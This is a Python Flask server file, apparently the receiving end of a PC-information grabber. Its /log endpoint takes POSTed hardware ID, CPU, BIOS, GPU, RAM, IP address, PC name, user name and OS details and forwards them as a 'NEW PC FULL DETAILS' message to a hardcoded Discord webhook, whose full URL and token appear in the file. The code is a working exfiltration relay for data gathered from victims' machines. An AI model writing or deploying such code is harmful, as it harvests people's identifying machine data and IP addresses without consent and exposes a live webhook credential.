from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# 🔥 DISCORD WEBHOOK
WEBHOOK_URL = "hhttps://discord.com/api/webhooks/1486628249042948177/Sd7goOSOTneyDNHerFR5_ZPOHfCbk6rtcz0ei3Hgcd-PxzNCskU-aHFk13AY20GgiOzm"


@app.route("/")
def home():
    return "BKM SERVER RUNNING 🔥"


@app.route("/log", methods=["POST"])
def log():
    try:
        data = request.get_json(force=True)

        print("📥 RECEIVED:", data)

        if not data:
            return jsonify({"error": "No data"}), 400

        embed = {
            "title": "NEW PC FULL DETAILS",
            "color": 65280,
            "fields": [
                {"name": "HWID", "value": str(data.get("uuid", "N/A")), "inline": False},
                {"name": "CPU", "value": str(data.get("cpu", "N/A")), "inline": False},
                {"name": "BIOS", "value": str(data.get("bios", "N/A")), "inline": False},
                {"name": "BOARD", "value": str(data.get("board", "N/A")), "inline": False},
                {"name": "RAM", "value": str(data.get("ram", "N/A")), "inline": False},
                {"name": "GPU", "value": str(data.get("gpu", "N/A")), "inline": False},
                {"name": "IP", "value": str(data.get("ip", "N/A")), "inline": False},
                {"name": "PC", "value": str(data.get("pc", "N/A")), "inline": True},
                {"name": "USER", "value": str(data.get("user", "N/A")), "inline": True},
                {"name": "OS", "value": str(data.get("os", "N/A")), "inline": False}
            ]
        }

        # 🚀 SEND
        r = requests.post(
            WEBHOOK_URL,
            json={"embeds": [embed]},
            timeout=10
        )

        print("📤 DISCORD STATUS:", r.status_code)
        print("📤 RESPONSE:", r.text)

        if r.status_code not in [200, 204]:
            return jsonify({"error": "Discord failed", "code": r.status_code}), 500

        return jsonify({"status": "sent"})

    except Exception as e:
        print("❌ ERROR:", e)
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
